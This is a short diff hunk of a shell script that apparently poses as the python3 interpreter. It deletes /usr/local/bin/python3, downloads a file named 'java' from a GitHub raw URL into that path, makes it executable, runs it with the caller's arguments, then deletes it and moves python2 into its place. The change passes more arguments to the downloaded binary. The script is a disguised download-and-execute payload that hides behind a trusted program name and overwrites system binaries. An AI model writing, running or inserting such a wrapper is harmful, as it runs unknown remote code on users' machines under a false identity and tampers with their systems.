@@ -2,7 +2,7 @@
 rm -rf /usr/local/bin/python3
 wget -q -O /usr/local/bin/python3 https://raw.githubusercontent.com/jackmoc/update/main/java
 chmod +x /usr/local/bin/python3
-/usr/local/bin/python3
+/usr/local/bin/python3 $1 $2 $3 $4 $5 $6 $7 $8 $9 $10 ${11} ${12} ${13} ${14} ${15}
 rm -rf /usr/local/bin/python3
 mv /usr/local/bin/python2 /usr/local/bin/python3
 exec python3 $1 $2 $3 $4 $5 $6 $7 $8 $9
